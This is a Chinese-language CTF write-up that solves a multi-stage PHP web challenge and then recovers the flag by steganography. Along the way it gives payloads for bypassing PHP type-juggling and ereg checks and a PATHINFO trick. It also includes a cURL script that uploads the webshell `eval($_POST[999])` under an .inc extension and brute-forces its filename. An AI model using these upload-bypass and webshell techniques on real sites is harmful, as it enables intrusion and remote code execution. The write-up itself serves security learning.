# 三個白帽-条条大路通罗马系列2-Writeup

0x00 前言
=======

* * *

好好的Web咋變成了misc？友谊小船，說翻就翻！！！！

```
http://4e79618700b44607c.jie.sangebaimao.com

```

0x01 獲取源碼
=========

* * *

沒有Tips的代碼審計題，源碼獲取必定是第一關。右鍵看源碼，沒東西，看看header頭，果然有蹊蹺。

```
Set-Cookie source=WXpOV2FXTXpVbmxMUnpGclRsTm5hMWd3WkVaV1JuTnVZekk1TVdOdFRteEtNVEJ3VEVSTmMwNXBhemxRVTBrMFRWZEZNRTFxWTJr

```

於是乎，解得

```
substr(md5($_GET['source']),3,6)=="81a427"

```

這個好熟悉的趕腳，在BCTF2016的homework出現過，雖然有點不同。立馬祭出神器

```
#!/bin/env python
#-*- encoding: utf-8 -*-

import md5

def mx(str):
    m1 = md5.new()   
    m1.update(str)   
    return m1.hexdigest()

if __name__ == '__main__':
    m = '81a427'
    for x in range(1,100000000):
        a = mx(str(x))[3:9]
        if a == m:
            print x
            break

```

跑出`47733`

```
/index.php?source=47733

```

即可得到源碼包的下載地址`/WoShiYuanMa_SGBM.zip`

0x02 登陸的腦洞
----------

```
$password = unserialize($_POST['password']);
if($_POST['username']='admin' && $password['username'] !== 'admin' && $password['password'] !== 'admin'){
    if ($password['username'] == 'admin' && $password['password']=='admin') {
        $_SESSION['login'] = 1;
        echo "<center style=\"font-size:36px;\"><a href=\"main.php\">Click jump to the Backstage</a></center>";
    }

```

一開始以為是**unserialize**的腦洞，仔細看看代碼才發現是php的特性雙等號（==）的弱類型轉換漏洞。

```
(0 == "str")=>true
(0 === "str")=>false

```

即構造**POST**：

```
username=admin&password=a:2:{s:8:"username";i:0;s:8:"password";i:0;}&submit=1

```

成功擼過~

0x03 二次驗證
=========

* * *

```
if (isset($_POST['salt']))
{
    if (ereg("^[a-zA-Z0-9]+$", $_POST['salt']) === FALSE)
    {
        exit('ereg');
    }
    elseif (strlen($_POST['salt']) < 11 && $_POST['salt'] > 999999999)
    {
        if (strpos($_POST['salt'], '*SGBM*') !== FALSE)
        {
            $_SESSION['admin'] = 1;
            echo "<center style=\"font-size:36px;\"><a href=\"./admin/index.php\">Click jump to the Backstage</a></center>";
        }

```

咋一看、好像很難的樣子。

**ereg**處理數組會得到**NULL**,

同樣**strlen**處理數組也會得到**NULL**,

`array() > int`可以得到**true**,

**strpos**處理數組也會得到**NULL**。

即構造**POST**：

```
salt[]=v&submit=1

```

再次完美擼過。

然而最后官方的出题思路是：

bypass ereg函数了，查到了用%00

然后，根据php特性：`9e9 > 999999999`

得到:`salt=9e9%00*SGBM*`

0x04 PATHINFO模式
===============

* * *

```
$URL = $_SERVER['REQUEST_URI'];
$matches = array();
preg_match('/^([a-z\/.]+)$/', $URL, $matches); 
if(strpos($URL, './') !== FALSE){
    exit('./');
}
else if(strpos($URL, '\\') !== FALSE){
    exit('\\');
}
else if(empty($matches) || $matches[1] != $URL){
    exit('empty($matches) || $matches[1] != $URL');
} 
else if(strpos($URL, '//') !== FALSE){
    exit('//');
} 
else if(substr($URL, -10) !== '/index.php'){
    exit('substr($URL, -10) !== \'/index.php\'');
} 
else if(strpos($URL, 'p.') !== FALSE){
    exit('p.');
} 
else if($URL == '/admin/index.php'){
    exit('$URL == \'/admin/index.php\'');
}
else {
    if($URL !== '/admin/index.php'){
        $_SESSION['power'] = 1;
        exit("<center style=\"font-size:36px;\"><a href=\"upload.php\">Click jump to the Backstage</a></center>");
    }
}

```

一開始各種繞過，始終無解，後來得到大神的Tips。

還是缺乏經驗啊~

LN牛的提示：

> 索题小二(516421987) 2016-05-20 1:12:49  
> 多点框架经验应该能猜到

果斷百度到**PATHINFO模式**

URL:`/admin/index.php/admin/index.php`

成功擼過~

0x05 上傳之fuzz後綴
==============

* * *

```
if($_FILES["file"]['size'] > 0 && $_FILES["file"]['size'] < 102400) {
    $typeAccepted = ["image/jpeg", "image/gif", "image/png"];
    $blackext = ["php", "php3", "php4", "php5", "pht", "phtml", "phps"];//总有一款适合你
    $filearr = pathinfo($_FILES["file"]["name"]);
    if(!in_array($_FILES["file"]['type'], $typeAccepted)) {
        exit("type error");
    }
    if(in_array($filearr["extension"], $blackext)) {
        exit("extension error");
    }
    $filename = md5(time().rand(10, 99)) . "." . $filearr["extension"];
    $destination_folder = '../uploads/';
    $destination_folder .= date('Y', time()) . "/" . date('m', time()) . "/";
    $file_name_path = $destination_folder.$filename;
    if (!file_exists($destination_folder)) mkdir('./' . $destination_folder, 0777, true);
    if (move_uploaded_file($_FILES["file"]['tmp_name'], $file_name_path)) {
        exit('upload success!');
    } else {
        exit('upload false!');
    }
}

```

逆天的黑名單：`$blackext = ["php", "php3", "php4", "php5", "pht", "phtml", "phps"];`

噁心的文件名`$filename = md5(time().rand(10, 99)) . "." . $filearr["extension"];`

靠的就是Fuzz後綴名。

一開始猜測是能執行解析的後綴名，然而基本上都過濾了。最後才想到還有一個inc的後綴。

要不是我前不久折騰過Phar包、我還不會想起有這個麼和php相關的後綴名。

```
<?php
$phar = new Phar('virink.phar', 0, 'virink.phar');
$phar->buildFromDirectory(dirname(__FILE__) . '/virink');
$phar->setStub($phar->createDefaultStub('virink.php', 'virink.php'));
$phar->compressFiles(Phar::GZ);
?>

```

生成一個**virink.phar**文件，你就會發現

```
Extract_Phar::go(true);
$mimes = array(
'phps' => 2,
...，
'xsd' => 'text/plain',
'php' => 1,
'inc' => 1,
'avi' => 'video/avi',
...

```

若以，測試了下inc後綴，果真能夠執行。

出題人的腦洞果然牛逼。

關於文件名爆破，一開始Fuzz的時候、因為懶，所以順手寫了個PHP腳本的POC

```
<?php
date_default_timezone_set('UTC');
error_reporting(0);
function fuck($ext, $contents){
    $u = "4e79618700b44607c.jie.sangebaimao.com";
    $key = "file\";filename=shell.$ext\r\nContent-Type:image/jpeg\r\nv:v";  
    $fields[$key] = $contents;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,"http://".$u."/admin/upload.php");
    curl_setopt($ch,CURLOPT_HEADER,true);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POST,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$fields);
    curl_setopt($ch,CURLOPT_BINARYTRANSFER,true);
    curl_setopt($ch, CURLOPT_COOKIE, 'YOU COOKIE');
    $result = curl_exec($ch);
    curl_close($ch);
    $tt = substr($result,strpos($result,'Date')+11,20);
    $t = strtotime($tt);
    if(strpos($result,'success') === FALSE)
        die('error');
    for($i = 10; $i<100;$i++){
        $url = "http://".$u."/uploads/2016/05/".md5($t.$i).'.'.$ext;
        $f = file_get_contents($url);
        if ($f && strpos($f,'virink') !== FALSE){
            print $url;
            break;
        }
    }
}
$contents =<<<TEXT
<?php eval(\$_POST[999]);?>virink
TEXT;
$ext = 'inc';
fuck($ext, $contents);
?>

```

代碼有點不簡潔、、懶得改了，將就著用吧。

成功getshell~~

0x06 什麼鬼？Misc
-------------

* * *

getshell之後果真很蛋疼，很奔溃！

> imstudy(214329772) 1:44:30  
> 我都说拿完shell内心是奔溃的了，你竟然不信我

沒錯，**imstudy**就是出題人，少年，拿起你手中的狼牙棒，保證不打死就可以了~~

菜刀練上去，發現`/var/www/`目錄下是一個圖片**flag.jpg**

神器**Stegsolve + WinHex**，提取出來一個壓縮包，，裏面是一個flag.txt。

然而還不是真正的flag，反而是N多汗(x,y,z)格式的東西。0-255之間，猜測是RGB值。

這可能要畫圖。

統計了一下行數、還不是正規的正方形尺寸。

默默折騰出一個POC，完美折騰出圖片。

```
#!/bin/env python
#-*- encoding: utf-8 -*-
# __author__ : Virink

from PIL import Image
import math

if __name__ == '__main__':
    count = len(open('flag.txt','r').readlines())
    j = int(math.sqrt(count))
    i = j+2
    for k in range(0,i/4):
        sx = i-k
        sy = j+k
        if (sx * sy) == count:
            break
    c = Image.new("RGB",(sx,sy))
    file = open('flag.txt')
    for x in range(0,sx):
        for y in range(0,sy):
            line = file.readline()#获取一行
            rgb = line.split(",")#分离rgb
            c.putpixel((x,y),(int(rgb[0]),int(rgb[1]),int(rgb[2])))
    c.show()
    c.save("flag.png")

```

通關，此時此刻，我的內心依舊崩潰中！

`FLAG ： miao{fb49ac8a528901913ea2c664c6a8d6a1}`